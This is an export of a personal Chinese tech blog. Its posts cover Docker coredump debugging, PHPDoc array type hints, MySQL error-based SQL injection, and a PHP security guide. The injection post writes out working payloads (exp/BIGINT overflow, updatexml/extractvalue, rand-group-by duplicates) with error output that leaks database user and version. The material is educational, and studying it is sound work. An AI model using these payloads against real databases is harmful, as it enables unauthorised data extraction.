{"meta":{"title":"TWO SEE","subtitle":"SEE is the sea of cc","description":"show you my code","author":"Twosee","url":"http://www.twosee.cn"},"pages":[{"title":"about","date":"2017-12-28T05:56:11.000Z","updated":"2017-12-28T05:58:21.000Z","comments":true,"path":"about/index.html","permalink":"http://www.twosee.cn/about/index.html","excerpt":"","text":"Twosee Originator of Toast studio Student of CUST Creator of Custed Creator of Rocat (toast cat robot)"},{"title":"文章分类","date":"2017-12-28T05:54:54.000Z","updated":"2018-01-08T07:12:46.000Z","comments":true,"path":"categories/index.html","permalink":"http://www.twosee.cn/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2017-12-28T05:53:47.000Z","updated":"2018-01-08T07:12:16.000Z","comments":true,"path":"tags/index.html","permalink":"http://www.twosee.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"在Docker中处理coredump && PHP-coredump与gdb使用","slug":"php-coredump-in-docker","date":"2018-03-04T13:03:01.000Z","updated":"2018-03-04T13:52:49.206Z","comments":true,"path":"2018/03/04/php-coredump-in-docker/","link":"","permalink":"http://www.twosee.cn/2018/03/04/php-coredump-in-docker/","excerpt":"","text":"前几天在计划写一个爬虫脚本时, 由于涉及到html的浏览器渲染, 干脆用就用浏览器和控制台运行js脚本来作为爬虫工具, chrome支持ES6语法(有些需要在dev设置中开启), 写起来也是十分舒服, 爬完数据并处理过后通过xhr扔给后端服务器即可, 后端是用Swoole负责接收并向数据库进行大文本插入, 不幸的是在这时候错误出现了. 在数千个请求后nginx代理的后端挂掉了,返回了502BadGateWay,肯定要去上游找原因了,由于swoole是跑在docker容器中的, 于是马上查看容器日志 1$ docker logs custed_swoole_1 --tail 100 可以看到如下报错 1$ WARNING swProcessPool_wait: worker#0 abnormal exit, status=0, signal=11 google了一下没找到相关问题, 只能请教rango, 说是signal11是coredump了, 让我抓一下core文件 然后就开始踩坑了, 我的服务是运行在docker中的, docker里要抓core文件需要一波操作了… 废话不多说直接总结一下坑 1. 开启容器特权没有特权模式, 容器里就无法使用gdb调试 我用的是docker-compose 所以配置里需要加这么一行 1privileged: true 如果是run的话, 加: 1--privileged 2.开启coredump文件配置12ulimits: core: -1 # core_dump debug 1--ulimit core=-1 3. 在容器里安装GDB重新做镜像是不可能的了, 临时装一个吧(ps: 如果你不想在配置文件里开启core可以在这里临时设置) 12ulimit -c unlimitedapt-get install -y gdb 4. 触发coredump测试我们可以用一段c代码死循环来尝试触发一个coredump 使用-g```编译, 加-g选项是为了保证debug信息生成在应用程序当中.1234567```c#include &lt;stdio.h&gt; int main(int argc, char** argv) &#123; int* p = NULL; *p = 10; &#125; 然后 1gdb a.out core 5. 修改core文件命名坑爹的是, 项目里根目录恰好有个Core文件夹,我的mac硬盘分区给的又是大小写不敏感, GG, 改一波命名.. 1echo 'core.%e.%p' &gt; /proc/sys/kernel/core_pattern","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.twosee.cn/tags/php/"},{"name":"coredump","slug":"coredump","permalink":"http://www.twosee.cn/tags/coredump/"},{"name":"docker","slug":"docker","permalink":"http://www.twosee.cn/tags/docker/"}]},{"title":"PHPDoc类型提示数组的对象","slug":"PHPDoc-type-hinting-for-array-of-objects","date":"2018-01-28T13:28:29.000Z","updated":"2018-01-28T13:38:00.000Z","comments":true,"path":"2018/01/28/PHPDoc-type-hinting-for-array-of-objects/","link":"","permalink":"http://www.twosee.cn/2018/01/28/PHPDoc-type-hinting-for-array-of-objects/","excerpt":"问题描述因此，在PHPDoc中，可以在成员变量声明之上指定@var来提示其类型。然后一个IDE，例如PHPEd将知道它正在使用什么类型的对象，并且能够为该变量提供代码洞察。 123456&lt;?php class Test &#123; /** @var SomeObj */ private $someObjInstance; &#125; 这样做很好，直到我需要对一组对象做同样的事情，以便在以后迭代这些对象时才能获得正确的提示。 那么，有没有办法声明一个PHPDoc标签来指定成员变量是SomeObj的数组？ @var数组是不够的，例如@var array(SomeObj)似乎没有效果。 最佳解决方案在JetBrains的PhpStorm IDE中，您可以使用/** @var SomeObj[] */，例如： 1234/** * @return SomeObj[] */function getSomeObjects() &#123;...&#125; phpdoc documentation推荐这种方法： specified containing a single type, the Type definition informs the reader of the type of each array element. Only one Type is then expected as element for a given array. Example: @return int[]","text":"问题描述因此，在PHPDoc中，可以在成员变量声明之上指定@var来提示其类型。然后一个IDE，例如PHPEd将知道它正在使用什么类型的对象，并且能够为该变量提供代码洞察。 123456&lt;?php class Test &#123; /** @var SomeObj */ private $someObjInstance; &#125; 这样做很好，直到我需要对一组对象做同样的事情，以便在以后迭代这些对象时才能获得正确的提示。 那么，有没有办法声明一个PHPDoc标签来指定成员变量是SomeObj的数组？ @var数组是不够的，例如@var array(SomeObj)似乎没有效果。 最佳解决方案在JetBrains的PhpStorm IDE中，您可以使用/** @var SomeObj[] */，例如： 1234/** * @return SomeObj[] */function getSomeObjects() &#123;...&#125; phpdoc documentation推荐这种方法： specified containing a single type, the Type definition informs the reader of the type of each array element. Only one Type is then expected as element for a given array. Example: @return int[] 次佳解决方案12345foreach ($Objs as $Obj)&#123; /* @var $Obj Test */ // You should be able to get hinting after the preceding line if you type $Obj-&gt;&#125; 我在Zend Studio中做了很多工作。不知道其他编辑，但它应该工作。 第三种解决方案Netbeans提示： 您可以在$users[0]-&gt;和$this-&gt;上获取用户类数组的代码完成。 1234/** * @var User[] */var $users = array(); 当您完成$this-&gt;...时，您还可以看到类成员列表中的数组类型 第四种方案指定变量是一个对象数组： 123$needles = getAllNeedles();/* @var $needles Needle[] */$needles[1]-&gt;... //codehinting works 这在Netbeans 7.2(我正在使用它) 还有： 12345$needles = getAllNeedles();/* @var $needles Needle[] */foreach ($needles as $needle) &#123; $needle-&gt;... //codehinting works&#125; 因此在foreach中使用声明是不必要的。 第五种方案我更喜欢阅读和编写干净的代码 – 如Robert C. Martin的”Clean Code”所述。当遵循他的信条时，您不应要求开发人员(作为您的API的用户)知道数组的(内部)结构。 API用户可能会问：这是仅一维的数组吗？物体是否在多维数组的各个层次上传播？我需要访问所有对象有多少个嵌套循环(foreach等)？什么类型的对象是该数组中的”stored”？ 如您所概述的，您希望将该数组(其中包含对象)用作一维数组。 正如Nishi所概述的，你可以使用： 123/** * @return SomeObj[] */ 为了那个原因。 但再次：请注意 – 这不是一个标准的docblock符号。这种符号是由一些IDE生产者引入的。 好的，作为一名开发人员，您知道”[]”与PHP中的数组绑定。但是在正常的PHP上下文中”something[]”是什么意思？ “[]”意味着：在”something”中创建新元素。新的元素可以是一切。但是你想表达的是：具有相同类型的对象的数组，它的确切类型。您可以看到，IDE生产者引入了一个新的上下文。你必须学习的一个新的背景。 PHP开发人员必须学习的新环境(了解您的docblocks)。坏风格(！)。 因为你的数组确实有一个维度，你可能想要将这个“数组的对象”称为”list”。请注意，”list”在其他编程语言中具有非常特殊的意义。它会被更好地称为”collection”为例。 记住：您使用一种编程语言，可以为您提供OOP的所有选项。使用类而不是数组，并使类像数组一样遍历。例如。： 1class orderCollection implements ArrayIterator 或者如果要将内部对象存储在多维数组/对象结构中的不同级别上： 1class orderCollection implements RecursiveArrayIterator 此解决方案将使用”orderCollection”类型的对象替换您的数组，但是到目前为止，不能在IDE中启用代码完成。好的。下一步： 实现与docblock接口引入的方法 – 特别是： 1234567891011121314151617/** * [...] * @return Order */orderCollection::current()/** * [...] * @return integer E.g. database identifier of the order */orderCollection::key()/** * [...] * @return Order */orderCollection::offsetGet() 不要忘记使用类型提示： 12orderCollection::append(Order $order)orderCollection::offsetSet(Order $order) 这个解决方案停止引入很多： 12/** @var $key ... *//** @var $value ... */ 所有的代码文件(例如循环内)，因为Zahymaka证实了他/他的答案。您的API用户不会被迫引用该文档块，以使代码完成。要只在一个地方有@return可以减少冗余(@var)作为mutch尽可能的。使用@var“docBlocks”会使您的代码变得最不可读。 最后你完成了看起来很难看看起来像大锤打破一个坚果？不是真的，因为你熟悉那些接口和干净的代码。记住：你的源代码是一次写/读很多。 如果IDE的代码完成无法使用此方法，请切换到更好的(例如IntelliJ IDEA，PhpStorm，Netbeans)或在IDE生成器的问题跟踪器上提交功能请求。 感谢Christian Weiss(来自德国)担任我的教练，并教我如此伟大的东西。 PS：在邢会见我和他 第六种方案PSR-5: PHPDoc提出了一种形式的Generics-style表示法。 Syntax1234Type[]Type&lt;Type&gt;Type&lt;Type[, Type]...&gt;Type&lt;Type[|Type]...&gt; 集合中的值可能甚至是另一个数组，甚至另一个集合。 123Type&lt;Type&lt;Type&gt;&gt;Type&lt;Type&lt;Type[, Type]...&gt;&gt;Type&lt;Type&lt;Type[|Type]...&gt;&gt; 例子1234567891011121314&lt;?php$x = [new Name()];/* @var $x Name[] */$y = new Collection([new Name()]);/* @var $y Collection&lt;Name&gt; */$a = new Collection(); $a[] = new Model_User(); $a-&gt;resetChanges(); $a[0]-&gt;name = \"George\"; $a-&gt;echoChanges();/* @var $a Collection&lt;Model_User&gt; */ 注意：如果您期望IDE执行代码辅助，那么另一个问题是IDE是否支持PHPDoc Generic-style集合符号。 从我的答案到this question。 第七种方案在NetBeans 7.0(也可能较低)中，您可以声明返回类型“具有文本对象的数组”，就像@return Text一样，并且代码提示将起作用： 编辑：使用@Bob Fanger建议更新示例 12345678/** * get all Tests * * @return Test|Array $tests */public function getAllTexts()&#123; return array(new Test(), new Test());&#125; 只需使用它： 1234567$tests = $controller-&gt;getAllTests();//$tests-&gt; //codehinting works!//$tests[0]-&gt; //codehinting works!foreach($tests as $text)&#123; //$test-&gt; //codehinting works!&#125; 它不是完美的，但最好只是离开它只是”mixed”，女巫没有带来价值。 CONS是你被允许以数组为背景，因为文本对象将会抛出错误。 第八种方案在Zend Studio中使用array[type]。 在Zend Studio中，array[MyClass]或array[int]甚至array[array[MyClass]]都很棒。 第九种方案正如DanielaWaranie在答案中提到的那样 – 当您在$ collectionObject中迭代$ items时，有一种方法来指定$ item的类型：将@return MyEntitiesClassName添加到current()以及返回值的Iterator和Iterator和ArrayAccess方法的其余部分。 繁荣！ /** @var SomeObj[] $collectionObj */不需要foreach，并且与收藏对象一起使用，无需以@return SomeObj[]描述的特定方法返回收藏。 我怀疑并不是所有的IDE都支持它，但它在PhpStorm中工作得很好，这让我更开心。 例： 1234567891011Class MyCollection implements Countable, Iterator, ArrayAccess &#123; /** * @return User */ public function current() &#123; return $this-&gt;items[$this-&gt;cursor]; &#125; //... implement rest of the required `interface` methods and your custom&#125; 有什么有用的我会添加发布这个答案在我的情况下，current()和interface方法的其余部分在Abstract -collection类中实现，我不知道最终将在集合中存储什么样的实体。 所以这里是窍门：不要在抽象类中指定返回类型，而是在特定的集合类的描述中使用PhpDoc instuction @method。 例： 12345678910111213141516171819202122232425262728293031Class User &#123; function printLogin() &#123; echo $this-&gt;login; &#125;&#125;Abstract Class MyCollection implements Countable, Iterator, ArrayAccess &#123; protected $items = []; public function current() &#123; return $this-&gt;items[$this-&gt;cursor]; &#125; //... implement rest of the required `interface` methods and your custom //... abstract methods which will be shared among child-classes&#125;/** * @method User current() * ...rest of methods (for ArrayAccess) if needed */Class UserCollection extends MyCollection &#123; function add(User $user) &#123; $this-&gt;items[] = $user; &#125; // User collection specific methods...&#125; 现在，使用类： 123456789$collection = new UserCollection();$collection-&gt;add(new User(1));$collection-&gt;add(new User(2));$collection-&gt;add(new User(3));foreach ($collection as $user) &#123; // IDE should `recognize` method `printLogin()` here! $user-&gt;printLogin();&#125; 再次：我怀疑并不是所有的IDE都支持它，而PhpStorm则是这样。尝试你的，发表评论结果！ 参考文献 PHPDoc type hinting for array of objects?","categories":[],"tags":[{"name":"PHP PHPstorm IDE","slug":"PHP-PHPstorm-IDE","permalink":"http://www.twosee.cn/tags/PHP-PHPstorm-IDE/"}]},{"title":"Mysql注入后利用","slug":"mysql-injection","date":"2018-01-05T17:33:18.000Z","updated":"2018-01-08T07:19:39.000Z","comments":true,"path":"2018/01/06/mysql-injection/","link":"","permalink":"http://www.twosee.cn/2018/01/06/mysql-injection/","excerpt":"SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。 MYSQL报错注入个人认为大体可以分为以下几类： BIGINT等数据类型溢出 xpath语法错误 concat+rand()+group_by()导致主键重复 一些特性 下面就针对这几种错误类型看看背后的原理是怎样的。","text":"SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。 MYSQL报错注入个人认为大体可以分为以下几类： BIGINT等数据类型溢出 xpath语法错误 concat+rand()+group_by()导致主键重复 一些特性 下面就针对这几种错误类型看看背后的原理是怎样的。 0x01 数据溢出这里可以看到mysql是怎么处理整形的：Integer Types (Exact Value)，如下表： img 在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况： 12mysql&gt; select 18446744073709551615+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)' 在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可： 12345678910mysql&gt; select ~0;+----------------------+| ~0 |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)mysql&gt; select ~0+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos; 我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的： 1234567891011121314151617181920212223mysql&gt; select (select * from (select user())x);+----------------------------------+| (select * from (select user())x) |+----------------------------------+| root@localhost |+----------------------------------+1 row in set (0.00 sec)mysql&gt; select !(select * from (select user())x);+-----------------------------------+| !(select * from (select user())x) |+-----------------------------------+| 1 |+-----------------------------------+1 row in set (0.01 sec)mysql&gt; select !(select * from (select user())x)+1;+-------------------------------------+| !(select * from (select user())x)+1 |+-------------------------------------+| 2 |+-------------------------------------+1 row in set (0.00 sec) 同理，利用exp函数也会产生类似的溢出错误： 12345678910mysql&gt; select exp(709);+-----------------------+| exp(709) |+-----------------------+| 8.218407461554972e307 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select exp(710);ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos; 注入姿势： 12mysql&gt; select exp(~(select*from(select user())x));ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos; 利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果： 12mysql&gt; select (select(!x-~0)from(select(select user())x)a);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(&apos;root@localhost&apos;)) - ~(0))&apos; 而在mysql&gt;5.5.53时，则不能返回查询结果 12mysql&gt; select (select(!x-~0)from(select(select user())x)a);ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(`a`.`x`)) - ~(0))&apos; 此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到： 1234/* Max length of a error message. Should bekept in sync with MYSQL_ERRMSG_SIZE. */#define ERRMSGSIZE (512) 0x02 xpath语法错误从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容: 1234567mysql&gt; select extractvalue(1,&apos;/a/b&apos;);+------------------------+| extractvalue(1,&apos;/a/b&apos;) |+------------------------+| |+------------------------+1 row in set (0.01 sec) 它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里： 1234mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos; 0x03 主键重复这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的： 12mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos; 可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关： 12mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos; 这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下： 123456789101112mysql&gt; select * from test;+------+-------+| id | name |+------+-------+| 0 | jack || 1 | jack || 2 | tom || 3 | candy || 4 | tommy || 5 | jerry |+------+-------+6 rows in set (0.00 sec) 我们以select count(*) from test group by name语句说明大致过程如下： 先是建立虚拟表，其中key为主键，不可重复： key count(*) 开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1： key count(*) jack 1 key count(*) jack 1+1 key count(*) jack 1+1 tom 1 key count(*) jack 1+1 tom 1 candy 1 当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)： 12345678910111213141516171819202122232425mysql&gt; select rand(0) from test;+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 || 0.620881741513388 || 0.6387474552157777 || 0.33109208227236947 || 0.7392180764481594 || 0.7028141661573334 |+---------------------+6 rows in set (0.00 sec)mysql&gt; select rand(0) from test;+---------------------+| rand(0) |+---------------------+| 0.15522042769493574 || 0.620881741513388 || 0.6387474552157777 || 0.33109208227236947 || 0.7392180764481594 || 0.7028141661573334 |+---------------------+6 rows in set (0.00 sec) 同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)： 1234mysql&gt; select floor(rand(0)*2) from test;+------------------+| floor(rand(0)*2) |+-----------","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.twosee.cn/tags/mysql/"},{"name":"sql","slug":"sql","permalink":"http://www.twosee.cn/tags/sql/"},{"name":"injection","slug":"injection","permalink":"http://www.twosee.cn/tags/injection/"}]},{"title":"2018 PHP 应用程序安全设计指北","slug":"php-app-security","date":"2018-01-05T17:33:18.000Z","updated":"2018-01-08T07:28:51.000Z","comments":true,"path":"2018/01/06/php-app-security/","link":"","permalink":"http://www.twosee.cn/2018/01/06/php-app-security/","excerpt":"The 2018 Guide to Building Secure PHP Software！ 前言2018 年将至，一般程序员（特别是 Web 开发程序员）应当抛弃过去开发PHP程序的很多不好的习惯和观念了。虽然部分人不以为意，但是这确实是事实。 这个指南应该以重点部分作为 PHP: The Right Way 安全章节的补充，而不是以一般的 PHP 编程话题。 正文PHP 版本 请在 2018 年使用 PHP 7.2, 并且计划 2019 年初切换到 PHP 7.3。 PHP 7.2 已于 2017 年 11 月 30 日发布。 写这篇文章的时候，只有 7.1 和 7.2 版本还在被 PHP 官方积极维护，而 5.6 和 7.0 只在大概1年内提供安全补丁更新。 对于其他官方不维护的 PHP 版本，虽然某些操作系统会提供长期支持和维护，但这其实通常是有害的。尤其是他们提供安全支持补丁却没有版本号，这使得很难解释系统的安全性（仅仅知道 PHP 版本）。 因此，无论其他供应商提出了什么承诺，如果可以，你就应该在任何时候都坚决地使用官方提供支持的 PHP 版本。这样，尽管最终是一个短暂的安全版本，但一个不断致力于升级的版本，总会让你收获一些意外的惊喜。","text":"The 2018 Guide to Building Secure PHP Software！ 前言2018 年将至，一般程序员（特别是 Web 开发程序员）应当抛弃过去开发PHP程序的很多不好的习惯和观念了。虽然部分人不以为意，但是这确实是事实。 这个指南应该以重点部分作为 PHP: The Right Way 安全章节的补充，而不是以一般的 PHP 编程话题。 正文PHP 版本 请在 2018 年使用 PHP 7.2, 并且计划 2019 年初切换到 PHP 7.3。 PHP 7.2 已于 2017 年 11 月 30 日发布。 写这篇文章的时候，只有 7.1 和 7.2 版本还在被 PHP 官方积极维护，而 5.6 和 7.0 只在大概1年内提供安全补丁更新。 对于其他官方不维护的 PHP 版本，虽然某些操作系统会提供长期支持和维护，但这其实通常是有害的。尤其是他们提供安全支持补丁却没有版本号，这使得很难解释系统的安全性（仅仅知道 PHP 版本）。 因此，无论其他供应商提出了什么承诺，如果可以，你就应该在任何时候都坚决地使用官方提供支持的 PHP 版本。这样，尽管最终是一个短暂的安全版本，但一个不断致力于升级的版本，总会让你收获一些意外的惊喜。 依赖管理 人生苦短，我用 Composer 在 PHP 生态中，Composer 是最先进的依赖管理方案。我们推荐 PHP: The Right Way 中关于依赖管理的完整章节。 如果你没有使用 Composer 来管理应用的依赖，最终（hopefully later but most likely sooner）会导致应用里某个依赖会严重过时，然后老旧版本中的漏洞会被利用于计算机犯罪。 重要： 开发软件时，时常记得保持依赖的更新。幸运地，这只需一行命令： 1composer update 如果你正在使用某些专业的，需要使用 PHP 扩展（C 语言编写），那你不能使用 Composer 管理，而需要 PECL 。 推荐扩展不管你正在编写什么，你总会受益于这些依赖。这是除了大多数 PHP 程序员的推荐（PHPUnit, PHP-CS-Fixer, …）外的补充。 roave/security-advisories Roave’s security-advisories 使用 Friends of PHP repository 确保你的项目没有依赖一些已知易受攻击的依赖。 1composer require roave/security-advisories:dev-master 或者，你可以上传你的composer.lock文件到 Sensio Labs ，作为例行自动化漏洞评估工作流的一部分，以提醒发现任何过时的软件包。 vimeo/psalm Psalm 是一个帮助你识别代码里可能存在 bugs 的静态分析工具。还有其他很好的静态分析工具（例如 Phan 和 PHPStan 都很棒），但当你发现你需要支持 PHP 5，Psalm 将是 PHP 5.4+ 的首选。 使用 Psalm 挺简单： 12345678# Version 1 doesn't exist yet, but it will one day:composer require --dev vimeo/psalm:^0# Only do this once:vendor/bin/psalm --init# Do this as often as you need:vendor/bin/psalm 如果你是第一次在现有代码库运行，可能会看到很多红色错误。但除非你在构建像 WordPress 那么大的程序，否则努力通过所有测试绝不是艰巨的。 无论使用哪种静态分析工具，我们都推荐你能将他加入到持续集成工作流（Continuous Integration workflow）中，以便在每次更改代码中运行。 HTTPS 和浏览器安全 HTTPS, which should be tested, and security headers . 2018 年，不安全的 HTTP 网站将不再被接受。幸运的是，由于 ACME 协议 和 Let’s Encrypt certificate authority，免费的 TLS 证书成为了可能。 将 ACME 集成到你的服务器，小菜一碟。 Caddy: 自动加入。 Apache: 很快作为mod_md可用。在此之前，网上很多高质量教程。 Nginx: 相对简单。 你也许会想，“好，我已经有 TLS 证书了，为了网站变得安全和快速，得花些时间折腾配置信息。” 不！Mozilla做了件好事情！。你可以根据网站的目标受众，使用配置生成器生成推荐套件。 如果你希望网站安全，HTTPS ( HTTP over TLS ) 是绝对不能妥协的。使用 HTTPS 立刻就能消除多种攻击（中间人攻击、窃听、重放攻击以及若干允许用户模仿的会话形式的攻击）。 安全头在服务器使用 HTTPS 确实为用户提供了许多安全性和性能方面的好处，但也还能通过利用某些浏览器的安全功能来进一步提升安全性。而这大部分会涉及到响应内容的安全头。 1Content-Security-Policy 你需要该 Header ，因为它提供了对于浏览器是否允许加载内部和外部资源的细化控制，从而为跨域脚本攻击漏洞提供了有效防御层。 参阅 CSP-Builder，以便快速简便地部署/管理内容安全策略（Content Security Policies）。 为了更加深入的分析， Scott Helme’s introduction to Content-Security-Policy headers，会是一个很好的引导。 1Expect-CT 你需要该 Header ，因为它能通过强制某些不良行为者将其错误证书的证据颁发到可公开验证的仅可追加的数据结构，从而针对流氓/受损的证书颁发机构增加一层防护。 优先设置为enforce,max-age=30。只要你有足够的自信该 Header 不会造成服务中断，增加max-age吧。 1Referrer-Policy 你需要该 Header ，因为它允许你控制用户的行为信息是否泄露给第三方。 同样地，Scott Helme 提供了一篇关于Referrer-Policy Header 介绍好文。 除非有理由允许更加宽松的设置，否则请设置为same-origin或no-referrer。 1Strict-Transport-Security 你需要该 Header ，因为它告诉浏览器通过 HTTPS 而不是不安全的 HTTP ，将 future requests 设为同源。 在第一次部署时，将其设置为max-age = 30，然后当你确信没有任何内容会中断时，将此值增加到某个较大的值（例如 31536000）。 1X-Content-Type-Options 你需要该 Header ，因为 MIME 类型的混淆可能会导致不可预知的结果，包括奇怪的允许 XSS 漏洞的边缘情况。这最好伴随着一个标准的 Content-Type Header 。 除非需要默认的行为（例如文件的下载），否则请设置为nosniff。 1X-Frame-Options 你需要该 Header ，因为它允许你防止点击劫持。 设置为DENY (或者SAMEORIGIN, 但仅仅当你使用&lt;frame&gt;元素的时候)。 1X-XSS-Protection 你需要该 Header ，因为它启用了一些默认情况下未启用的浏览器反 XSS 功能。 设置为1; mode=block。 同样，如果你使用 PHP 的内置会话管理功能（建议使用），则可能需要这样调用session_start()： 12345&lt;?phpsession_start([ 'cookie_httponly' =&gt; true, 'cookie_secure' =&gt; true]); 这会强制你的应用在发送会话标识符时使用 HTTP-Only 和 Secure 标志，从而防止 XSS 攻击窃取用户的 Cookie ，并强制它们分别通过 HTTPS 发送。 我们之前在 2015 年的博客文章中介绍了安全的 PHP 会话。 子资源完整性在将来的某个时候，你也许会使用 CDN 来加载网站的公共 JavaScript/CSS 库。安全工程师已经遇见了这存在一个明显的风险，如果很多网站使用 CDN 提供内容，Hack 和替换 CDN（获得了 CDN 的控制权）就可以注入（恶意）代码到成千上万的网站。 查阅子资源完整性吧。 子资源完整性（SRI，Subresource integrity）允许你将希望 CDN 服务的文件的内容进行哈希处理。目前实行的 SRI 只允许使用安全的密码散列函数，这意味着攻击者不可能生成与原始文件哈希相同的恶意版本资源。 一个真实例子: Bootstrap v4-alpha uses SRI in their CDN example snippet 1234567891011&lt;link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css\" integrity=\"sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ\" crossorigin=\"anonymous\"/&gt;&lt;script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js\" integrity=\"sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; 文档关系Web 开发人员经常在超链接上设置目标属性（例如，target =&quot;_ blank&quot;在新窗口中打开链接）。但是，如果你没有传递rel =&quot;noopener&quot;标签，则可以允许目标页面控制当前页面。 不要这样做： 1&lt;a href=\"http://example.com\" target=\"_blank\"&gt;Click here&lt;/a&gt; 这会让http://example.com页面能控制当前页面。 而应该这样做： 1&lt;a href=\"https://example.com\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;Click here&lt;/a&gt; 通过这样在新窗口打开https://example.com，当前窗口的控制权也不会授予可能的恶意第三方。 可以更加深入研究。 开发安全的 PHP 程序如果应用程序安全性对你来说是一个新话题，请从应用程序安全性简介开始吧。 大多数安全专家指出，开发者可以使用 OWASP Top 10 等资源开始着手。 但是，大多数常见的漏洞也可以是相同高等级的安全问题（例如代码和数据没有完全分离、逻辑不严谨和健全、操作环境不安全或是可破译的密码协议等）。 我们的假设是，应该授予安全新手知道一些更简单、基础的安全知识和问题，并如何解决这些问题，应该是一个更好的、长远的安全工程。 因此，我们避免推荐十大或二十大安全清单。 数据库注入 避免 PHP 程序存在 SQL 注入。 如果你是自己编写 SQL 代码，请确保使用prepared语句，并且从网络或文件系统提供的信息都作为参数传递，而不是字符串拼接的形式。此外，确保你没有使用模拟的prepared语句。 为了达到好的效果，可以使用 EasyDB 。 不要这样做： 123&lt;?php/* Insecure code: */$query = $pdo-&gt;query(\"SELECT * FROM users WHERE username = '\" . $_GET['username'] . \"'\"); 应该这样做： 123&lt;?php/* Secure against SQL injection: */$results = $easydb-&gt;row(\"SELECT * FROM users WHERE username = ?\", $_GET['username']); 还有其他数据库抽象层提供了相同的安全性（EasyDB实际上是在使用 PDO ，但在实际的prepare语句前避免了prepared语句模拟）。 只要用户输入不会影响查询的结构，就很安全（包括存储过程）。 文件上传 深入：如何安全地允许用户上传文件？ 接受文件上传是一个冒险的提议，但只要采取一些基本的预防措施，是能保证安全的。也就是说，允许文件直接上传的话，这些文件可能会被意外的允许执行或解释。上传的文件应该是只读（read-only）或读写（read-write）的，永远不应该可执行（executable）。 如果你的网站根目录是/var/www/example.com，请不要保存上传文件在/var/www/example.com/uploaded_files。 而应该保存到一个不能直接访问的目录（例如：/var/www/example.com-uploaded/），以免意外地将其作为服务器端脚本执行，并获得执行远程代码的后门。 一个更加简洁的方法是将网站根目录往下移动一个层级（即：/var/www/example.com/public）。 如何安全地下载这些上传文件也是一个问题。 直接访问 SVG 图像类型时，将在用户浏览器执行 JavaScript 代码。尽管它的MIME类型中的image/前缀具有误导性，但是这是正确的。 正如前面提及的，MIME 类型嗅探可能导致类型混淆攻击。请参阅X-Content-Type-Options。 如果你放弃前面关于如何安全地存储上传文件的建议，攻击者就会通过上传 .php 或 .phtml 文件，直接在浏览器中访问文件来执行任意代码，从而完全控制服务器。 跨站脚本 关于 PHP 中的跨站脚本攻击，你想知道的都在这里 同样地，预防 XSS 和 SQL 注入是一样简单的。我们有简单而易用的 API 来分离文档结构（structure of a document）和填充的数据。 然而，实际上还有很多 Web 开发程序员仍是通过生成一大串 HTML 代码作为响应的形式开发。并且，这不是 PHP 独有的现实，这是所有 Web 开发程序员都应该重视的。 减少 XSS 漏洞不失为一个好方法。总之，前面谈及的浏览器安全的章节就显得十分相关了。简言之： 